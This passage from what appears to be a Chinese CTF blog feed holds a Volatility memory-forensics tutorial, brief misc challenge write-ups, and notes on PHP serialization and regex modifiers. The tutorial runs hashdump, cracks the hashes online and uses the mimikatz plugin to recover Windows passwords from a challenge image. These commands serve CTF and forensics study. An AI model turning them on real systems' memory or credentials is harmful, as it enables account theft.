class="code"><pre><span class="line">python2 vol.py -f Challenge.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000011fd0ca70 -D ./</span><br><span class="line">Q：内存位置</span><br><span class="line">D：提取程序后保存的地址，./指的是当前shell正在运行的文件夹地址，输入pwd命令可以查看shell当前的地址，简单来说就是保存到当前文件夹</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/535675245dd846e9a588e036ab6c4428.png" alt="img"></p><p>提取出来的文件名是包含内存地址的，更改一下后缀名即可运行</p><h3 id="查看浏览器历史记录">查看浏览器历史记录</h3><p>Volatility 中的 iehistory 插件可以用于提取 Internet Explorer 浏览器历史记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f Challenge.raw --profile=Win7SP1x64 iehistory</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a232c42576c74dfca9c3879eddd1ba5b.png" alt="img"></p><h3 id="提取用户密码-hash-值并爆破">提取用户密码 hash 值并爆破</h3><p>Volatility 中的 Hashdump 插件可以用于提取系统内存中的密码哈希值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f Challenge.raw --profile=Win7SP1x64 hashdump</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7936d30ef7bd47739846e8c717da9af5.png" alt="img"></p><p>这里提取了四个用户的密码 hash 值，我们将这些字符串复制一下，粘贴到本地本文里</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a1de0d61b1c5411fb5307512a86d050d.png" alt="img"></p><p>我们可以使用这个在线网站：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://crackstation.net/</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2f67c4a94399411c8ebae5afe0ed8cef.png" alt="img"></p><p>将 hash 值粘贴上去</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a2a920a2960b445d9bd1aed994ab0903.png" alt="img"></p><p>就可以得到用户密码明文</p><h3 id="使用-mimikatz-提取密码">使用 mimikatz 提取密码</h3><p>mimikatz 是一个开源的用于从 Windows 操作系统中提取明文密码，哈希值以及其他安全凭据的工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f Challenge.raw --profile=Win7SP1x64 mimikatz</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/efc11fc02f9b4ef5990e72c614ce0e03.png" alt="img"></p><p>成功提取到 TroubleMaker 用户的密码</p><h3 id="查看剪切板里的内容">查看剪切板里的内容</h3><p>Volatility 中的 clipboard 插件可以用于从内存转储中提取剪贴板数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f Challenge.raw --profile=Win7SP1x64 clipboard</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/29ae5ed5721449be99d7bd02a63b30e8.png" alt="img"></p><h3 id="查看正在运行的服务">查看正在运行的服务</h3><p>svcscan 是 Volatility 中的一个插件，用于扫描进程中所有的服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svcscan</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/402e4071e224454ba767e7f648382c3b.png" alt="img"></p><p>执行了 svcscan 之后，每列代表服务的一些信息，包括服务名、PID、服务状态、服务类型、路径等等</p><h3 id="查看网络连接状态">查看网络连接状态</h3><p>Volatility 中的 netscan 插件可以在内存转储中查找打开的网络连接和套接字，该命令将显示所有当前打开的网络连接和套接字。输出包括本地和远程地址、端口、进程 ID 和进程名称等信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f Challenge.raw --profile=Win7SP1x64 netscan</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/902b4ff077424d839920315f41516242.png" alt="img"></p><h3 id="查看注册表信息">查看注册表信息</h3><p>printkey 是 Volatility 工具中用于查看注册表的插件之一。它可以帮助分析人员查看和解析注册表中的键值，并提供有关键值的详细信息，如名称、数据类型、大小和值等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f Challenge.raw --profile=Win7SP1x64 printkey</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b78477c28c3d4013a6339b5c7440c90e.png" alt="img"></p><p>然后使用 hivelist 插件来确定注册表的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f Challenge.raw --profile=Win7SP1x64 hivelist</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/dee0917b8cd04757b7574753e848d77b.png" alt="img"></p><p>查看注册表 software 项</p><p>hivedump 是一个 Volatility 插件，用于从内存中提取 Windows 注册表的内容，这里我们选择第一个来演示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f Challenge.raw --profile=Win7SP1x64 hivedump -o 0xfffff8a00127d010</span><br><span class="line">o：hivelist列出的Virtual值</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/471fb2976a1e4fdcbb239c4d528dde9b.png" alt="img"></p><p>根据名称查看具体子项的内容，这里以 SAM\Domains\Account\Users\Names 做演示，这个是 Windows 系统中存储本地用户账户信息的注册表路径，它包含了每个本地用户账户的名称和对应的 SID 信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f Challenge.raw --profile=Win7SP1x64 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/abf787f806634700b013b8583bfaab5b.png" alt="img"></p><p>如果要提取全部的注册表，可以用这个命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f Challenge.raw --profile=Win7SP1x64 dumpregistry -D ./</span><br></pre></td></tr></table></figure><h3 id="全部插件">全部插件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">amcache         查看AmCache应用程序痕迹信息</span><br><span class="line">apihooks        检测内核及进程的内存空间中的API hook</span><br><span class="line">atoms           列出会话及窗口站atom表</span><br><span class="line">atomscan        Atom表的池扫描(Pool scanner)</span><br><span class="line">auditpol        列出注册表HKLMSECURITYPolicyPolAdtEv的审计策略信息</span><br><span class="line">bigpools        使用BigPagePoolScanner转储大分页池(big page pools)</span><br><span class="line">bioskbd         从实时模式内存中读取键盘缓冲数据(早期电脑可以读取出BIOS开机密码)</span><br><span class="line">cachedump       获取内存中缓存的域帐号的密码哈希</span><br><span class="line">callbacks       打印全系统通知例程</span><br><span class="line">clipboard       提取Windows剪贴板中的内容</span><br><span class="line">cmdline         显示进程命令行参数</span><br><span class="line">cmdscan         提取执行的命令行历史记录（扫描_COMMAND_HISTORY信息）</span><br><span class="line">connections     打印系统打开的网络连接(仅支持Windows XP 和2003)</span><br><span class="line">connscan        打印TCP连接信息</span><br><span class="line">consoles        提取执行的命令行历史记录（扫描_CONSOLE_INFORMATION信息）</span><br><span class="line">crashinfo       提取崩溃转储信息</span><br><span class="line">deskscan        tagDESKTOP池扫描(Poolscaner)</span><br><span class="line">devicetree      显示设备树信息</span><br><span class="line">dlldump         从进程地址空间转储动态链接库</span><br><span class="line">dlllist         打印每个进程加载的动态链接库列表</span><br><span class="line">driverirp       IRP hook驱动检测</span><br><span class="line">drivermodule    关联驱动对象至内核模块</span><br><span class="line">driverscan      驱动对象池扫描</span><br><span class="line">dumpcerts       提取RAS私钥及SSL公钥</span><br><span class="line">dumpfiles       提取内存中映射或缓存的文件</span><br><span class="line">dumpregistry    转储内存中注册表信息至磁盘</span><br><span class="line">editbox         查看Edit编辑控件信息 (Listbox正在实验中)</span><br><span class="line">envars          显示进程的环境变量</span><br><span class="line">eventhooks      打印Windows事件hook详细信息</span><br><span class="line">evtlogs         提取Windows事件日志（仅支持XP/2003)</span><br><span class="line">filescan        提取文件对象（file objects）池信息</span><br><span class="line">gahti           转储用户句柄（handle）类型信息</span><br><span class="line">gditimers       打印已安装的GDI计时器(timers)及回调(callbacks)</span><br><span class="line">gdt             显示全局描述符表(Global Deor Table)</span><br><span class="line">getservicesids  获取注册表中的服务名称并返回SID信息</span><br><span class="line">getsids         打印每个进程的SID信息</span><br><span class="line">handles         打印每个进程打开的句柄的列表</span><br><span class="line">hashdump        转储内存中的Windows帐户密码哈希(LM/NTLM)</span><br><span class="line">hibinfo         转储休眠文件信息</span><br><span class="line">hivedump        打印注册表配置单元信息</span><br><span class="line">hivelist        打印注册表配置单元列表</span><br><span class="line">hivescan        注册表配置单元池扫描</span><br><span class="line">hpakextract     从HPAK文件（Fast Dump格式）提取物理内存数据</span><br><span class="line">hpakinfo        查看HPAK文件属性及相关信息</span><br><span class="line">idt             显示中断描述符表(Interrupt Deor Table)</span><br><span class="line">iehistory       重建IE缓存及访问历史记录</span><br><span class="line">imagecopy       将物理地址空间导出原生DD镜像文件</span><br><span class="line">imageinfo       查看/识别镜像信息</span><br><span class="line">impscan         扫描对导入函数的调用</span><br><span class="line">joblinks        打印进程任务链接信息</span><br><span class="line">kdbgscan        搜索和转储潜在KDBG值</span><br><span class="line">kpcrscan        搜索和转储潜在KPCR值</span><br><span class="line">ldrmodules      检测未链接的动态链接DLL</span><br><span class="line">lsadump         从注册表中提取LSA密钥信息（已解密）</span><br><span class="line">machoinfo       转储Mach-O 文件格式信息</span><br><span class="line">malfind         查找隐藏的和插入的代码</span><br><span class="line">mbrparser       扫描并解析潜在的主引导记录(MBR)</span><br><span class="line">memdump         转储进程的可寻址内存</span><br><span class="line">memmap          打印内存映射</span><br><span class="line">messagehooks    桌面和窗口消息钩子的线程列表</span><br><span class="line">mftparser       扫描并解析潜在的MFT条目</span><br><span class="line">moddump         转储内核驱动程序到可执行文件的示例</span><br><span class="line">modscan         内核模块池扫描</span><br><span class="line">modules         打印加载模块的列表</span><br><span class="line">multiscan       批量扫描各种对象</span><br><span class="line">mutantscan      对互斥对象池扫描</span><br><span class="line">notepad         查看记事本当前显示的文本</span><br><span class="line">objtypescan     扫描窗口对象类型对象</span><br><span class="line">patcher         基于页面扫描的补丁程序内存</span><br><span class="line">poolpeek        可配置的池扫描器插件</span><br><span class="line">printkey        打印注册表项及其子项和值</span><br><span class="line">privs           显示进程权限</span><br><span class="line">procdump        进程转储到一个可执行文件示例</span><br><span class="line">pslist          按照EPROCESS列表打印所有正在运行的进程</span><br><span class="line">psscan          进程对象池扫描</span><br><span class="line">pstree          以树型方式打印进程列表</span><br><span class="line">psxview         查找带有隐藏进程的所有进程列表</span><br><span class="line">qemuinfo        转储 Qemu 信息</span><br><span class="line">raw2dmp         将物理内存原生数据转换为windbg崩溃转储格式</span><br><span class="line">screenshot      基于GDI Windows的虚拟屏幕截图保存</span><br><span class="line">servicediff     Windows服务列表(ala Plugx)</span><br><span class="line">sessions        _MM_SESSION_SPACE的详细信息列表(用户登录会话)</span><br><span class="line">shellbags       打印Shellbags信息</span><br><span class="line">shimcache       解析应用程序兼容性Shim缓存注册表项</span><br><span class="line">shutdowntime    从内存中的注册表信息获取机器关机时间</span><br><span class="line">sockets         打印已打开套接字列表</span><br><span class="line">sockscan        TCP套接字对象池扫描</span><br><span class="line">ssdt            显示SSDT条目</span><br><span class="line">strings         物理到虚拟地址的偏移匹配(需要一些时间，带详细信息)</span><br><span class="line">svcscan         Windows服务列表扫描</span><br><span class="line">symlinkscan     符号链接对象池扫描</span><br><span class="line">thrdscan        线程对象池扫描</span><br><span class="line">threads         调查_ETHREAD 和_KTHREADs</span><br><span class="line">timeliner       创建内存中的各种痕迹信息的时间线</span><br><span class="line">timers          打印内核计时器及关联模块的DPC</span><br><span class="line">truecryptmaster Recover     恢复TrueCrypt 7.1a主密钥</span><br><span class="line">truecryptpassphrase     查找并提取TrueCrypt密码</span><br><span class="line">truecryptsummary    TrueCrypt摘要信息</span><br><span class="line">unloadedmodules 打印卸载的模块信息列表</span><br><span class="line">userassist      打印注册表中UserAssist相关信息</span><br><span class="line">userhandles     转储用户句柄表</span><br><span class="line">vaddump         转储VAD数据为文件</span><br><span class="line">vadinfo         转储VAD信息</span><br><span class="line">vadtree         以树形方式显示VAD树信息</span><br><span class="line">vadwalk         显示遍历VAD树</span><br><span class="line">vboxinfo        转储Virtualbox信息（虚拟机）</span><br><span class="line">verinfo         打印PE镜像中的版本信息</span><br><span class="line">vmwareinfo      转储VMware VMSS/VMSN 信息</span><br><span class="line">volshell        内存镜像中的shell</span><br><span class="line">windows         打印桌面窗口(详细信息)</span><br><span class="line">wintree         Z顺序打印桌面窗口树</span><br><span class="line">wndscan         池扫描窗口站</span><br><span class="line">yarascan        以Yara签名扫描进程或内核内存</span><br></pre></td></tr></table></figure><h2 id="总结">总结</h2><p>本篇文章演示的插件已经可以做绝大部分题目了，之后就多在 buuctf 或者 ctfshow 等线上 ctf 平台刷题，积累经验</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.7.23</title>
      <link href="/posts/7a958074.html"/>
      <url>/posts/7a958074.html</url>
      
        <content type="html"><![CDATA[<h2 id="ctf秀新手笔刷题">ctf秀新手笔刷题</h2><h3 id="杂项签到">杂项签到</h3><p>下载文件后解压，是一张图片，放进010editor，搜索ctf，找到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240723204704886.png" alt="image-20240723204704886"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240723204723218.png" alt="image-20240723204723218"></p><h3 id="损坏的压缩包">损坏的压缩包</h3><p>打开压缩包，发现打不开，确实是损坏的压缩包。损坏的话可能是格式不太对，或者格式对了但是内容有问题</p><p>图片的格式可以用dat图的前两个字节来区别， jpg= FF D8，png =89 50，gif =47 49，Bmp=42 4D</p><p>丢进010editor看下，前两个字节是89 50，这个文件头标识对应的是png。把文件的后缀改成png就能正常显示了。</p><p>揣测了一下出题人出这道题，感觉很好出的，只要随便找张图片拿画图软件画上flag，然后把前两个字节改掉</p><h3 id="谜之阑珊">谜之阑珊</h3><p>比较两文件不同，扔进010editor，比较文件就能查看</p><h3 id="你会数数吗">你会数数吗</h3><p>题目提示“你会数数吗”，统计每个字符出现的词频，然后降序排列，得到flag(脚本)</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>序列化和反序列化</title>
      <link href="/posts/83d613f6.html"/>
      <url>/posts/83d613f6.html</url>
      
        <content type="html"><![CDATA[<p>网站：【CTF_Web：反序列化学习笔记（一）php中的类与对象 - CSDN App】<a href="http://t.csdnimg.cn/8DZX7">http://t.csdnimg.cn/8DZX7</a><br>【CTF_Web：反序列化学习笔记（二）CTF经典考题由浅至深 - CSDN App】<a href="http://t.csdnimg.cn/NNftL">http://t.csdnimg.cn/NNftL</a></p><p>数组序列化<br>原数组： [‘a’=&gt;‘str’, ‘b’=&gt;1, ‘c’=&gt;false]<br>序列化后： a:3:{s:1:“a”;s:3:“str”;s:1:“b”;i:1;s:1:“b”;i:1;s:1:“c”;b:0;}</p><p>对象序列化<br>对于PHP中的类C，属性 data=“abc” 会被序列化为不同的形式（%00代表空字符）<br>Public属性： s:4:“data”;s:3:“abc”<br>Private属性： s:7&quot;%00C%00data&quot;;s:3:“abc”<br>Protected属性： s:7&quot;%00*%00data&quot;;s:3:“abc”</p><p>其它数据类型<br>String（字符串）：s<br>Integer（整型）：i<br>Bool（Bool型）：b<br>NULL：N<br>Array（数组）：a<br>Object（对象）：o</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__construct()   //对象创建(new)时会自动调用。</span><br><span class="line">__wakeup()        //使用unserialize时触发</span><br><span class="line">__sleep()        //使用serialize时触发</span><br><span class="line">__destruct()        //对象被销毁时触发</span><br><span class="line">__call()        //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic()        //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get()        //用于从不可访问的属性读取数据 包括private或者是不存在的</span><br><span class="line">__set()        //用于将数据写入不可访问的属性</span><br><span class="line">__isset()        //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset()         //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString()    //把类当作字符串使用时触发</span><br><span class="line">__invoke()             //当脚本尝试将对象调用为函数时触发  就是加了括号</span><br><span class="line">__autoload()           //在代码中当调用不存在的类时会自动调用该方法。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式中各种前缀和后缀含义</title>
      <link href="/posts/ea68741d.html"/>
      <url>/posts/ea68741d.html</url>
      
        <content type="html"><![CDATA[<p>前缀：<br>‘.’代表着匹配前面的单个字符，<br>‘+’代表匹配一次或者是多次，<br>‘+？’代表重复一次或者多次，尽可能的少重复</p><p>后缀：<br>i ：(PCRE_CASELESS)<br>　　如果设定此修正符，模式中的字符将同时匹配大小写字母。<br>m：（PCRE_MULTILINE）<br>　　默认情况下，PCRE 将目标字符串作为单一的一“行”字符所组成的（甚至其中包含有换行符也是如此）。“行起始”元字符（^）仅仅匹配字符串的起始，“行结束”元字符（）仅仅匹配字符串的结束，或者最后一个字符是换行符时其前面（除非设定了D修正符）。这和Perl是一样的。　　当设定了此修正符，“行起始”和“行结束”除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。这和Perl的/m修正符是等效的。如果目标字符串中没有“\n”字符或者模式中没有或<br>，则设定此修正符没有任何效果。<br>s：（PCRE_DOTALL）<br>　　如果设定了此修正符，模式中的圆点元字符（.）匹配所有的字符，包括换行符（一般情况下‘.’是不能匹配‘\n’的）。没有此设定的话，则不包括换行符。这和 Perl 的 /s 修正符是等效的。排除字符类例如 [^a] 总是匹配换行符的，无论是否设定了此修正符。<br>x：（PCRE_EXTENDED）<br>　　如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中 的以外完全被忽略，在未转义的字符类之外的 # 以及下一个换行符之间的所有字符，包括两头，也都被忽略。这和 Perl 的 /x 修正符是等效的，使得可以在复杂的模式中加入注释。然而注意，这仅适用于数据字符。空白字符可能永远不会出现于模式中的特殊字符序列，例如引入条件子模式 的序列 (?( 中间。<br>e：<br>　　如果设定了此修正符，preg_replace() 在替换字符串中对逆向引用作正常的替换，将其作为 PHP 代码求值，并用其结果来替换所搜索的字符串。<br>　　只有 preg_replace() 使用此修正符，其它 PCRE 函数将忽略之。<br>　　注: 本修正符在 PHP3 中不可用。<br>A：（PCRE_ANCHORED）<br>　　如果设定了此修正符，模式被强制为“anchored”，即强制仅从目标字符串的开头开始匹配。此效果也可以通过适当的模式本身来实现（在 Perl 中实现的唯一方法）。<br>D：（PCRE_DOLLAR_ENDONLY）<br>　　如果设定了此修正符，模式中的美元元字符仅匹配目标字符串的结尾。没有此选项时，如果　　最后一个字符是换行符的话，美元符号也会匹配此字符之前（但不会匹配任何其它换行符之前）。如果设定了 m 修正符则忽略此选项。Perl 中没有与其等价的修正符。<br>S：<br>　　当一个模式将被使用若干次时，为加速匹配起见值得先对其进行分析。如果设定了此修正符则会进行额外的分析。目前，分析一个模式仅对没有单一固定起始字符的 non-anchored 模式有用。<br>U：（PCRE_UNGREEDY）<br>　　本修正符反转了匹配数量的值使其不是默认的重复，而变成在后面跟上“?”才变得重复。这和 Perl 不兼容。也可以通过在模式之中设定 (?U) 修正符或者在数量符之后跟一个问号（如 .*?）来启用此选项。<br>X（PCRE_EXTRA）<br>　　此修正符启用了一个 PCRE 中与 Perl 不兼容的额外功能。模式中的任何反斜线后面跟上一个没有特殊意义的字母导致一个错误，从而保留此组合以备将来扩充。默认情况下，和 Perl 一样，一个反斜线后面跟一个没有特殊意义的字母被当成该字母本身。当前没有其它特性受此修正符控制。<br>u（PCRE_UTF8）<br>　　此修正符启用了一个 PCRE 中与 Perl 不兼容的额外功能。模式字符串被当成 UTF-8。本修正符在 Unix 下自 PHP 4.1.0 起可用，在 win32 下自 PHP 4.2.3 起可用。自 PHP 4.3.5 起开始检查模式的 UTF-8 合法性。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title></title>
      <link href="/baidu_verify_codeva-iXhmPVpLHD.html"/>
      <url>/baidu_verify_codeva-iXhmPVpLHD.html</url>
      
        <content type="html"><![CDATA[384f63e6415dcd67bfb8581b59c2e166]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/owo.json"/>
      <url>/owo.json</url>
      
        <content type="html"><![CDATA[{"颜文字":{"type":"emoticon","container":[{"icon":"OωO","text":"Author: DIYgod"},{"icon":"|´・ω・)ノ","text":"Hi"},{"icon":"ヾ(≧∇≦*)ゝ","text":"开心"},{"icon":"(☆ω☆)","text":"星星眼"},{"icon":"（╯‵□′）╯︵┴─┴","text":"掀桌"},{"icon":"￣﹃￣","text":"流口水"},{"icon":"(/ω＼)","text":"捂脸"},{"icon":"∠( ᐛ 」∠)＿","text":"给跪"},{"icon":"(๑•̀ㅁ•́ฅ)","text":"Hi"},{"icon":"→_→","text":"斜眼"},{"icon":"୧(๑•̀⌄•́๑)૭","text":"加油"},{"icon":"٩(ˊᗜˋ*)و","text":"有木有WiFi"},{"icon":"(ノ°ο°)ノ","text":"前方高能预警"},{"icon":"(´இ皿இ｀)","text":"我从未见过如此厚颜无耻之人"},{"icon":"⌇●﹏●⌇","text":"吓死宝宝惹"},{"icon":"(ฅ´ω`ฅ)","text":"已阅留爪"},{"icon":"(╯°A°)╯︵○○○","text":"去吧大师球"},{"icon":"φ(￣∇￣o)","text":"太萌惹"},{"icon":"ヾ(´･ ･｀｡)ノ\"","text":"咦咦咦"},{"icon":"( ง ᵒ̌皿ᵒ̌)ง⁼³₌₃","text":"气呼呼"},{"icon":"(ó﹏ò｡)","text":"我受到了惊吓"},{"icon":"Σ(っ °Д °;)っ","text":"什么鬼"},{"icon":"( ,,´･ω･)ﾉ\"(´っω･｀｡)","text":"摸摸头"},{"icon":"╮(╯▽╰)╭ ","text":"无奈"},{"icon":"o(*////▽////*)q ","text":"脸红"},{"icon":"＞﹏＜","text":""},{"icon":"( ๑´•ω•) \"(ㆆᴗㆆ)","text":""}]},"Emoji":{"type":"emoji","container":[{"icon":"😄","text":"大笑"},{"icon":"😁","text":"嘻嘻"},{"icon":"😅","text":"苦笑"},{"icon":"🤣","text":"笑得满地打滚"},{"icon":"😂","text":"笑哭了"},{"icon":"🙂","text":"呵呵"},{"icon":"🙃","text":"倒脸"},{"icon":"😉","text":"眨眼"},{"icon":"😊","text":"羞涩微笑"},{"icon":"🥰","text":"喜笑颜开"},{"icon":"😍","text":"花痴"},{"icon":"🤩","text":"好崇拜哦"},{"icon":"😘","text":"飞吻"},{"icon":"😗","text":"亲亲"},{"icon":"😚","text":"羞涩亲亲"},{"icon":"😙","text":"微笑亲亲"},{"icon":"😋","text":"好吃"},{"icon":"😛","text":"吐舌"},{"icon":"😜","text":"单眼吐舌"},{"icon":"🤪","text":"滑稽"},{"icon":"😝","text":"眯眼吐舌"},{"icon":"🤗","text":"抱抱"},{"icon":"🤭","text":"不说"},{"icon":"🤫","text":"安静的脸"},{"icon":"🤔","text":"想一想"},{"icon":"🤐","text":"闭嘴"},{"icon":"🤨","text":"挑眉"},{"icon":"😐","text":"冷漠"},{"icon":"😑","text":"无语"},{"icon":"😶","text":"沉默"},{"icon":"😏","text":"得意"},{"icon":"😒","text":"不高兴"},{"icon":"🙄","text":"翻白眼"},{"icon":"😬","text":"龇牙咧嘴"},{"icon":"🤥","text":"说谎"},{"icon":"😶‍🌫️","text":"迷茫"},{"icon":"😮‍💨","text":"呼气"},{"icon":"😌","text":"松了口气"},{"icon":"😔","text":"沉思"},{"icon":"😪","text":"困"},{"icon":"🤤","text":"流口水"},{"icon":"😴","text":"睡着了"},{"icon":"😷","text":"感冒"},{"icon":"🤒","text":"发烧"},{"icon":"🤕","text":"受伤"},{"icon":"🤢","text":"恶心"},{"icon":"🤮","text":"呕吐"},{"icon":"🤧","text":"打喷嚏"},{"icon":"🥵","text":"脸发烧"},{"icon":"🥶","text":"冷脸"},{"icon":"🥴","text":"头昏眼花"},{"icon":"😵","text":"晕头转向"},{"icon":"🤯","text":"爆炸头"},{"icon":"😵‍💫","text":"晕"},{"icon":"🤠","text":"牛仔帽脸"},{"icon":"🥳","text":"聚会笑脸"},{"icon":"😎","text":"墨镜笑脸"},{"icon":"🤓","text":"书呆子脸"},{"icon":"🧐","text":"带单片眼镜的脸"},{"icon":"😕","text":"困扰"},{"icon":"😟","text":"担心"},{"icon":"🙁","text":"微微不满"},{"icon":"☹️","text":"不满"},{"icon":"😮","text":"吃惊"},{"icon":"😯","text":"缄默"},{"icon":"😲","text":"震惊"},{"icon":"😳","text":"脸红"},{"icon":"🥺","text":"恳求的脸"},{"icon":"😦","text":"啊"},{"icon":"😧","text":"极度痛苦"},{"icon":"😨","text":"害怕"},{"icon":"😰","text":"冷汗"},{"icon":"😥","text":"失望但如释重负"},{"icon":"😢","text":"哭"},{"icon":"😭","text":"放声大哭"},{"icon":"😱","text":"吓死了"},{"icon":"😖","text":"困惑"},{"icon":"😣","text":"痛苦"},{"icon":"😞","text":"失望"},{"icon":"😓","text":"汗"},{"icon":"😩","text":"累死了"},{"icon":"😫","text":"累"},{"icon":"🥱","text":"打呵欠"},{"icon":"😤","text":"傲慢"},{"icon":"😡","text":"怒火中烧"},{"icon":"😠","text":"生气"},{"icon"